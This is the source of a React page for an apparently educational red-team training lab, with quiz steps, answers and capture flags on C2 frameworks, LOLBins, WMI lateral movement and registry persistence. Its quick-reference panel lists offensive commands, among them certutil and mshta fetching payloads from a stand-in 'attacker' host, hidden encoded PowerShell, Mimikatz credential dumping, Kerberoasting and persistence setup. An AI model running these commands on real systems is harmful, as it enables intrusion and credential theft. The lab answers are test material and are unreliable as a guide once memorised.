'use client'
import React, { useState, useEffect } from 'react'
import Link from 'next/link'
import LabTerminal, { LabStep } from '../../../components/LabTerminal'
import FreeLabTerminal from '../../../components/FreeLabTerminal'

const accent = '#ff3333'
const moduleId = 'red-team'
const moduleName = 'Red Team Operations'
const moduleNum = '11'
const xpTotal = 135

const steps: LabStep[] = [
  {
    id: 'redteam-01',
    title: 'C2 Framework Selection',
    objective: 'A red team needs a Command & Control framework for persistent access. Name one modern C2 framework used in professional red team engagements.',
    hint: 'Popular choices: Cobalt Strike, Sliver, Havoc, Brute Ratel C4, Metasploit.',
    answers: ['cobalt strike', 'cobaltstrike', 'sliver', 'havoc', 'brute ratel', 'metasploit', 'empire'],
    xp: 20,
    explanation: 'Professional C2 frameworks provide: beacon/implant management, post-exploitation modules, team collaboration, malleable C2 profiles (traffic obfuscation). Sliver and Havoc are open-source alternatives to the expensive Cobalt Strike. Always use in authorized engagements only.'
  },
  {
    id: 'redteam-02',
    title: 'Living off the Land',
    objective: 'Living-off-the-Land (LotL) attacks use built-in OS tools to avoid detection. What Windows built-in tool can download files and execute code, commonly abused by attackers?',
    hint: 'A Windows scripting host — either powershell, wscript, or mshta are all valid.',
    answers: ['powershell', 'mshta', 'wscript', 'certutil', 'rundll32', 'regsvr32', 'bitsadmin'],
    xp: 25,
    explanation: 'LotL techniques use legitimate binaries (LOLBins): PowerShell, certutil, mshta, regsvr32, wscript. They bypass application whitelisting since these are trusted OS components. Detection relies on behavioral analytics — a certutil.exe downloading an EXE is suspicious regardless of the tool being legitimate.'
  },
  {
    id: 'redteam-03',
    title: 'OPSEC: Traffic Blending',
    objective: 'Red team OPSEC requires C2 traffic to look like legitimate traffic. What Cobalt Strike feature makes beacon traffic mimic real applications?',
    hint: 'The feature is called "Malleable C2 Profiles" — it shapes the traffic to look like specific apps.',
    answers: ['malleable c2', 'malleable c2 profiles', 'c2 profiles', 'malleable profiles'],
    flag: 'FLAG{c2_opsec_mastered}',
    xp: 30,
    explanation: 'Malleable C2 Profiles define how beacon traffic looks: HTTP headers, URIs, user-agent strings, sleep jitter. A profile can make beacon traffic look identical to Microsoft Teams or Amazon S3 traffic. Available profiles at github.com/rsmudge/Malleable-C2-Profiles.'
  },
  {
    id: 'redteam-04',
    title: 'Lateral Movement: WMI',
    objective: 'WMI (Windows Management Instrumentation) is commonly used for lateral movement. What command-line tool natively executes commands on remote Windows systems via WMI?',
    hint: 'The tool is built into Windows: wmic or impacket-wmiexec from Linux.',
    answers: ['wmic', 'wmiexec', 'impacket-wmiexec', 'wmi', 'wmiexec.py'],
    xp: 25,
    explanation: 'wmic /node:target_ip process call create "cmd.exe /c command" executes commands via WMI — no service installation required, less noisy than psexec. From Linux: impacket-wmiexec domain/user:password@target. WMI activity is logged in the Microsoft-Windows-WMI-Activity event log.'
  },
  {
    id: 'redteam-05',
    title: 'Persistence via Registry',
    objective: 'Establish persistence using a Windows registry Run key. What registry path runs programs at user logon for the current user?',
    hint: 'Path: HKCU (current user), then Software\\Microsoft\\Windows\\CurrentVersion\\Run',
    answers: [
      'hkcu\\software\\microsoft\\windows\\currentversion\\run',
      'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
      'hkey_current_user\\software\\microsoft\\windows\\currentversion\\run'
    ],
    flag: 'FLAG{persistence_established}',
    xp: 35,
    explanation: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run entries execute at each user logon. Set with: reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\payload.exe". Detected by Autoruns (Sysinternals) and most EDR products — use with OPSEC considerations.'
  }
]

export default function RedTeamLab() {
  const [guidedDone, setGuidedDone] = useState(false)
  const [freeLaunched, setFreeLaunched] = useState(false)
  const [earnedXp, setEarnedXp] = useState(0)
  const [showKeywords, setShowKeywords] = useState(false)

  useEffect(() => {
    const saved = localStorage.getItem('lab_red-team-lab')
    if (saved) {
      const d = JSON.parse(saved)
      if (d.done) { setGuidedDone(true); setEarnedXp(d.xp || 0) }
    }
  }, [])

  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#7a1a1a' }}>
        <Link href="/" style={{ color: '#7a1a1a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <Link href="/modules/red-team" style={{ color: '#7a1a1a', textDecoration: 'none' }}>RED TEAM OPS</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>LAB</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '6px', alignItems: 'center' }}>
          <Link href="/modules/red-team" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #3a0505', borderRadius: '3px', color: '#7a1a1a', fontSize: '7.5px', letterSpacing: '0.1em' }}>&#8592; CONCEPT</Link>
          <span style={{ padding: '3px 10px', background: 'rgba(255,51,51,0.1)', border: '1px solid rgba(255,51,51,0.4)', borderRadius: '3px', color: accent, fontSize: '7.5px', letterSpacing: '0.1em', fontWeight: 700 }}>LAB ACTIVE</span>
        </div>
      </div>

      {/* Progress banner */}
      <div style={{ background: 'rgba(255,51,51,0.04)', border: '1px solid rgba(255,51,51,0.15)', borderRadius: '6px', padding: '10px 16px', marginBottom: '1.5rem', display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap' }}>
        <div style={{ display: 'flex', gap: '6px' }}>
          {[{ label: 'PHASE 1', done: true, active: !guidedDone }, { label: 'PHASE 2', done: guidedDone, active: guidedDone }].map((p, i) => (
            <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
              <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: p.done ? accent : '#3a0505', border: p.active ? '2px solid ' + accent : '1px solid #3a0505', boxShadow: p.active ? '0 0 6px ' + accent : 'none' }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: p.done ? accent : '#5a1515', letterSpacing: '0.1em' }}>{p.label}</span>
              {i === 0 && <span style={{ fontSize: '7px', color: '#3a0505', margin: '0 2px' }}>—</span>}
            </div>
          ))}
        </div>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#8a4a4a' }}>
          MOD-{moduleNum} &nbsp;·&nbsp; {moduleName.toUpperCase()} &nbsp;·&nbsp; {xpTotal} XP AVAILABLE
        </div>
        {guidedDone && (
          <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, fontWeight: 700 }}>
            &#10003; GUIDED PHASE COMPLETE — LAUNCH FREE LAB BELOW
          </div>
        )}
      </div>

      {/* PHASE 1 */}
      <div style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: 'rgba(255,51,51,0.1)', border: '1px solid rgba(255,51,51,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: accent, fontWeight: 700 }}>1</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#5a1515', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 1 — GUIDED LEARNING</div>
            <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.4rem', fontWeight: 700, color: accent, margin: 0 }}>Red Team Operations Lab</h1>
          </div>
        </div>

        <p style={{ color: '#8a6a6a', fontSize: '0.85rem', marginBottom: '1rem', lineHeight: 1.7, fontFamily: 'JetBrains Mono, monospace' }}>
          C2 frameworks, living-off-the-land techniques, OPSEC, lateral movement, and persistence.
          Type real commands, earn XP, and capture flags. Complete all 5 steps to unlock Phase 2.
        </p>

        <div style={{ background: 'rgba(255,51,51,0.03)', border: '1px solid rgba(255,51,51,0.12)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.25rem', fontFamily: 'JetBrains Mono, monospace' }}>
          <div style={{ fontSize: '7px', color: '#3a0505', letterSpacing: '0.25em', marginBottom: '8px' }}>KEY CONCEPTS COVERED IN THIS LAB</div>
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: '6px' }}>
            {['C2 frameworks', 'Malleable C2 profiles', 'LOLBins / LotL', 'OPSEC tradecraft', 'WMI lateral movement', 'Registry persistence', 'EDR evasion', 'Red team reporting'].map(c => (
              <span key={c} style={{ fontSize: '7.5px', color: '#8a4a4a', background: 'rgba(255,51,51,0.06)', border: '1px solid rgba(255,51,51,0.12)', padding: '2px 8px', borderRadius: '3px' }}>{c}</span>
            ))}
          </div>
        </div>

        <LabTerminal
          labId="red-team-lab"
          moduleId={moduleId}
          title="Red Team Operations Lab"
          accent={accent}
          steps={steps}
          onComplete={(xp) => { setGuidedDone(true); setEarnedXp(xp) }}
        />
      </div>

      {/* PHASE 2 */}
      <div id="free-lab" style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: guidedDone ? 'rgba(255,51,51,0.15)' : 'rgba(0,0,0,0.3)', border: '1px solid ' + (guidedDone ? 'rgba(255,51,51,0.4)' : '#3a0505'), display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: guidedDone ? accent : '#5a1515', fontWeight: 700 }}>2</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: guidedDone ? '#8a4a4a' : '#5a1515', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 2 — FREE LAB ENVIRONMENT</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 700, color: guidedDone ? accent : '#5a1515' }}>Full Red Team Practice Sandbox</div>
          </div>
          {guidedDone && !freeLaunched && (
            <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#ffb347', background: 'rgba(255,179,71,0.08)', border: '1px solid rgba(255,179,71,0.2)', padding: '3px 10px', borderRadius: '3px' }}>
              GUIDED PHASE COMPLETE
            </div>
          )}
        </div>

        {!freeLaunched ? (
          <div style={{ background: guidedDone ? 'rgba(255,51,51,0.04)' : '#080202', border: '1px solid ' + (guidedDone ? 'rgba(255,51,51,0.25)' : '#1a0505'), borderRadius: '10px', padding: '2.5rem', textAlign: 'center', position: 'relative', overflow: 'hidden' }}>
            {guidedDone && <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '2px', background: 'linear-gradient(90deg, transparent, ' + accent + ', transparent)' }} />}
            <div style={{ fontSize: '7px', color: guidedDone ? '#8a4a4a' : '#3a0505', letterSpacing: '0.3em', marginBottom: '1rem' }}>
              {guidedDone ? 'READY FOR COMPREHENSIVE TESTING' : 'COMPLETE GUIDED PHASE TO UNLOCK'}
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.2rem', color: guidedDone ? accent : '#5a1515', fontWeight: 700, marginBottom: '0.5rem' }}>
              LAUNCH FULL LAB ENVIRONMENT
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: '#8a4a4a', marginBottom: '0.75rem', lineHeight: 1.7 }}>
              Free-form terminal sandbox for Red Team Operations
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#5a1515', marginBottom: '2rem', lineHeight: 1.7 }}>
              Command history &nbsp;·&nbsp; Tab autocomplete &nbsp;·&nbsp; Real command simulation &nbsp;·&nbsp; No restrictions
            </div>
            <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', flexWrap: 'wrap', marginBottom: '2rem' }}>
              {['Sliver C2 framework', 'LOLBin techniques', 'WMI lateral movement', 'Registry persistence', 'EDR evasion', 'OPSEC tradecraft'].map(feat => (
                <div key={feat} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
                  <div style={{ width: '4px', height: '4px', borderRadius: '50%', background: guidedDone ? accent : '#3a0505' }} />
                  <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: guidedDone ? '#8a4a4a' : '#3a0505' }}>{feat}</span>
                </div>
              ))}
            </div>
            <button
              onClick={() => guidedDone && setFreeLaunched(true)}
              disabled={!guidedDone}
              style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.9rem', fontWeight: 700, letterSpacing: '0.15em', padding: '14px 40px', border: '1px solid ' + (guidedDone ? 'rgba(255,51,51,0.6)' : '#3a0505'), borderRadius: '6px', background: guidedDone ? 'rgba(255,51,51,0.12)' : 'transparent', color: guidedDone ? accent : '#3a0505', cursor: guidedDone ? 'pointer' : 'not-allowed', boxShadow: guidedDone ? '0 0 24px rgba(255,51,51,0.18)' : 'none', transition: 'all 0.2s' }}
            >
              {guidedDone ? '&#9658; LAUNCH FREE LAB ENVIRONMENT' : '&#128274; COMPLETE GUIDED PHASE FIRST'}
            </button>
            {!guidedDone && <div style={{ marginTop: '1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: '#3a0505' }}>Complete all 5 guided steps above to unlock the free lab environment</div>}
          </div>
        ) : (
          <div style={{ border: '1px solid ' + accent + '30', borderRadius: '10px', overflow: 'hidden', background: '#080202' }}>
            <FreeLabTerminal moduleId={moduleId} moduleName={moduleName} accent={accent} onClose={() => setFreeLaunched(false)} />
            <div style={{ padding: '8px 16px', background: '#0a0303', borderTop: '1px solid ' + accent + '15', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <div style={{ width: '5px', height: '5px', borderRadius: '50%', background: accent, boxShadow: '0 0 5px ' + accent }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#5a1515' }}>
                You are in free practice mode. Ask <span style={{ color: accent }}>GHOST AGENT</span> (bottom-right) for hints on any red team technique.
              </span>
            </div>
          </div>
        )}
      </div>

      {/* Quick reference */}
      <div style={{ marginBottom: '2rem' }}>
        <button onClick={() => setShowKeywords(!showKeywords)} style={{ background: 'transparent', border: '1px solid #3a0505', borderRadius: '5px', padding: '8px 16px', cursor: 'pointer', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#5a1515', letterSpacing: '0.1em', marginBottom: showKeywords ? '12px' : 0 }}>
          {showKeywords ? '▼' : '▶'} QUICK REFERENCE — RED TEAM COMMANDS
        </button>
        {showKeywords && (
          <div style={{ background: '#080202', border: '1px solid #1a0505', borderRadius: '6px', padding: '1.25rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(320px, 1fr))', gap: '8px' }}>
              {[
                ['sliver-server', 'Start Sliver C2 server'],
                ['sliver-client', 'Connect Sliver operator client'],
                ['certutil -urlcache -split -f http://attacker/payload.exe', 'LOLBin file download via certutil'],
                ['wmic /node:target process call create "powershell -enc BASE64"', 'WMI remote code execution'],
                ['reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Update /t REG_SZ /d C:\\payload.exe', 'Registry run key persistence'],
                ['schtasks /create /tn Update /tr C:\\payload.exe /sc onlogon', 'Scheduled task persistence'],
                ['powershell -nop -exec bypass -w hidden -enc BASE64PAYLOAD', 'PowerShell encoded command'],
                ['mshta.exe javascript:a=(GetObject("script:http://attacker/evil.sct")).Exec();close();', 'MSHTA LOLBin execution'],
                ['Invoke-Mimikatz -Command sekurlsa::logonpasswords', 'Dump creds via PowerShell'],
                ['Invoke-BloodHound -CollectionMethod All', 'BloodHound PowerShell collection'],
                ['Rubeus.exe kerberoast /outfile:hashes.txt', '.NET Kerberoasting'],
                ['SharpHound.exe -c All --zipfilename loot.zip', 'SharpHound AD collection'],
              ].map(([cmd, desc]) => (
                <div key={cmd} style={{ display: 'flex', gap: '10px', alignItems: 'flex-start', padding: '6px 8px', background: '#060101', borderRadius: '4px' }}>
                  <code style={{ color: accent, fontSize: '0.72rem', flexShrink: 0 }}>{cmd}</code>
                  <span style={{ color: '#8a4a4a', fontSize: '0.7rem' }}>{desc}</span>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Footer nav */}
      <div style={{ paddingTop: '2rem', borderTop: '1px solid #1a0505', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
        <Link href="/modules/red-team" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a1515' }}>&#8592; BACK TO CONCEPT</Link>
        <Link href="/modules/wireless-attacks/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a1515' }}>MOD-12 WIRELESS ATTACKS LAB &#8594;</Link>
      </div>
    </div>
  )
}
